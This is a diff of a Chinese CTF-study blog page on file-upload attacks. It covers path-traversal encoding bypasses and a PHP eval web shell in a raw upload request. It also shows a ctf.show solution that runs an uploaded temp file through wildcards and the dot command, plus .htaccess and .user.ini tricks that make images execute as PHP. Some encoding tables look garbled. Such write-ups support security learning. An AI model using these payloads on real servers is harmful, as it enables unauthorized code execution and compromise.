@@ -9,7 +9,7 @@
     
     <title>
         
-            123123 |
+            文件上传 |
         
         Keep Theme
     </title>
@@ -120,7 +120,7 @@
     <div class="article-content-container">
 
         <div class="article-title">
-            <span class="title-hover-animation">123123</span>
+            <span class="title-hover-animation">文件上传</span>
         </div>
 
         
@@ -139,8 +139,8 @@
                         <div class="article-meta-info">
     <span class="article-date article-meta-item">
         <i class="fas fa-edit"></i>&nbsp;
-        <span class="pc">2022-01-27 18:43:58</span>
-        <span class="mobile">2022-01-27 18:43</span>
+        <span class="pc">2022-01-27 19:35:52</span>
+        <span class="mobile">2022-01-27 19:35</span>
     </span>
     
     
@@ -157,7 +157,70 @@
         
 
         <div class="article-content markdown-body">
-            
+            <h1 id="文件上传"><a href="#文件上传" class="headerlink" title="文件上传"></a>文件上传</h1><h4 id="目录穿越绕过方式"><a href="#目录穿越绕过方式" class="headerlink" title="目录穿越绕过方式"></a>目录穿越绕过方式</h4><p>进行URL编码</p>
+<p>点–&gt;%2e 反斜杠–&gt;%2f 正斜杠–&gt;%5c</p>
+<p>进行16为Unicode编码</p>
+<p>点–&gt;%u002e 反斜杠–&gt;%u2215 正斜杠–&gt;%u2216</p>
+<p>进行双倍URL编码</p>
+<p>点–&gt;%252e 反斜杠–&gt;%u252f 正斜杠–&gt;%u255c</p>
+<p>进行超长UTF-8 Unicode编码</p>
+<p>点–&gt;%c0%2e %e0$40%ae %c0ae</p>
+<p>反斜杠–&gt;%c0af %e0%80af %c0%af</p>
+<p>正斜杠–&gt;%c0%5c %c0%80%5c</p>
+<p>文件上传绕过客户端</p>
+<p>• 1.用firebug将form表单中的onsubmit事件删除</p>
+<p>• 2.上传木马文件，Burp拦截数据包，修改扩展名</p>
+<p>代码案例：</p>
+<p>name：客户端的原始上传文件名称</p>
+<p>• Type：上传文件的MIME类型</p>
+<p>• Tmp_name：服务器端用来保存上传文件的临时文件路径</p>
+<p>• Error：上传文件时的错误信息</p>
+<p>• Size：上传文件的大小，单位是</p>
+<p>• Content-Length,即上传内容大小</p>
+<p>• MAX_FILE_SIZE,即上传内容的最大长度</p>
+<p>• filename,即上传文件名</p>
+<p>• Content-Type,即上传文件类型</p>
+<p>• 请求包中的乱码字段，即是所上传文件的内容</p>
+<p>• 有可能存在请求包中的可控点还有上传路径，只是上面的示例中没有出现</p>
+<p>php上传机制：</p>
+<p>0x01 PHP上传机制<br>php文件上传时会先将上传的文件保存到upload_tmp_dir该配置目录下，这里为/tmp，而上传页面只负责把该文件拷贝到目标目录。也就是说不管该php页面有没有文件上传功能，我们只要上传了文件，该文件就会被上传到upload_tmp_dir配置的目录下，上传完后会被删除。</p>
+<p>这里本地实验了一下，的确如此，我使用的是win10下phpstudy复现。</p>
+<p>需要把upload_tmp_dir 改为D:\phpStudy\tmp\tmp</p>
+<p>然后用intruder不停发包</p>
+<p>POST /test.php HTTP/1.1<br>Host: 127.0.0.1<br>User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:76.0) Gecko/20100101 Firefox/76.0<br>Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,<em>/</em>;q=0.8<br>Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2<br>Content-Type: multipart/form-data; boundary=—————————10242300956292313528205888<br>Accept-Encoding: gzip, deflate<br>Connection: close<br>Upgrade-Insecure-Requests: 1<br>Content-Length: 244</p>
+<p>—————————–10242300956292313528205888<br>Content-Disposition: form-data; name=”userfile1”; filename=”5.txt”<br>Content-Type: text/plain</p>
+<?php @eval($_POST['y1ng']); ?><p>—————————–10242300956292313528205888–</p>
+<p>最后发现了我们上传的文件：</p>
+<p>可惜我打开之后全是空的，不知道是不是因为已经被删除了。</p>
+<p>0x02 PHP命令执行<br>eval($cmd);<br>1<br>执行命令方式：</p>
+<p>system(‘ls’);</p>
+<p>echo(<code>ls</code>);</p>
+<p>echo+反引号</p>
+<p>?&gt;&lt;?=<code>ls</code>;</p>
+<?=是echo()的别名用法，不需要开启short_open_tag。
+需要先?><p>把前面的&lt;?php给闭合掉</p>
+<p>0x03 通配符与无字母数组命令执行</p>
+<p>既然./exp.txt可以用./??p????代替</p>
+<p>那么我们上传的临时文件phpxxxxx.tmp也可以用php?????.tmp代替</p>
+<p>0x04 解题<br>POST /?cmd=?&gt;&lt;?=<code>.+/??p/p?p??????</code>; HTTP/1.1<br>Host: 47fa7ca7-058a-42ff-b48f-de0382f95387.chall.ctf.show<br>User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:76.0) Gecko/20100101 Firefox/76.0<br>Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,<em>/</em>;q=0.8<br>Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2<br>Content-Type: multipart/form-data; boundary=—————————10242300956292313528205888<br>Accept-Encoding: gzip, deflate<br>Connection: keep-alive<br>Cookie: UM_distinctid=1739f845e394-0cffbf96840b0c8-4c302d7c-144000-1739f845e3b4e2<br>Upgrade-Insecure-Requests: 1<br>Cache-Control: max-age=0<br>Content-Length: 242</p>
+<p>—————————–10242300956292313528205888<br>Content-Disposition: form-data; name=”fileUpload”; filename=”1.txt”<br>Content-Type: text/plain</p>
+<p>#! /bin/bash</p>
+<p>cat /flag.txt<br>—————————–10242300956292313528205888–<br>0x05 .+/解释<br>我在做这道题的时候对于这个.+/有点不理解，还以为是通配符，后来才知道这里的.居然是个命令。source命令可简写为一个点.。</p>
+<p>linux .(点命令)：读取并且在当前的shell中执行文件中的命令<br>1<br>放个图你们就理解了</p>
+<p>点执行了tmp文件里的内容ls，所以这道题中.就是为了执行我们上传的文件中的cat /flag.txt。</p>
+<p>后记<br>这里的解释在p神的文章里都有，之前没仔细看，血亏，搞的似懂非懂很难受。。</p>
+<p><em><strong>判断服务器类型</strong></em></p>
+<p>看看是不是apache类型</p>
+<p>是就上传.htaccess</p>
+<p><img src="/.com//paixiaoxing\source_posts\文件上传\image-20211106200342144.png" alt="image-20211106200342144">把我们上传的文件等当成php运行</p>
+<p>AddType application/x-httpd-php.jpg</p>
+<p>将jpg文件当成php来执行</p>
+<p>其他的上传.user.ini</p>
+<p><img src="/.com//paixiaoxing\source_posts\文件上传\image-20211106200701876.png" alt="image-20211106200701876"></p>
+<p>php的上传接受multipart/form-data，然后会将它保存在临时文件中。php.ini中设置的<code>upload_tmp_dir</code>就是这个临时文件的保存目录。linux下默认为<code>/tmp</code>。也就是说，只要是php接收到上传的POST请求，就会保存一个临时文件，如何这个php脚本具有“上传功能”那么它将拷贝走，无论如何当脚本执行结束这个临时文件都会被删除。另外，这个php临时文件在linux系统下的命名规则永远是<code>phpXXXXXX</code></p>
+<p><img src="/.com//paixiaoxing\source_posts\文件上传\image-20220115093714101.png" alt="image-20220115093714101"></p>
+<p>php临时文件存储在linux系统中的名称规则永远是php后面跟六个随机字母</p>
+
         </div>
 
         
@@ -167,14 +230,29 @@
         
             <div class="article-nav">
                 
+                    <div class="article-prev">
+                        <a class="prev"
+                           rel="prev"
+                           href="/2022/01/27/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/"
+                        >
+                            <span class="left arrow-icon flex-center">
+                              <i class="fas fa-chevron-left"></i>
+                            </span>
+                            <span class="title flex-center">
+                                <span class="post-nav-title-item">文件包含</span>
+                                <span class="post-nav-item">Prev posts</span>
+                            </span>
+                        </a>
+                    </div>
+                
                 
                     <div class="article-next">
                         <a class="next"
                            rel="next"
-                           href="/2022/01/27/images/"
+                           href="/2022/01/27/%E5%BA%8F%E5%88%97%E5%8C%96/"
                         >
                             <span class="title flex-center">
-                                <span class="post-nav-title-item">images</span>
+                                <span class="post-nav-title-item">序列化</span>
                                 <span class="post-nav-item">Next posts</span>
                             </span>
                             <span class="right arrow-icon flex-center">
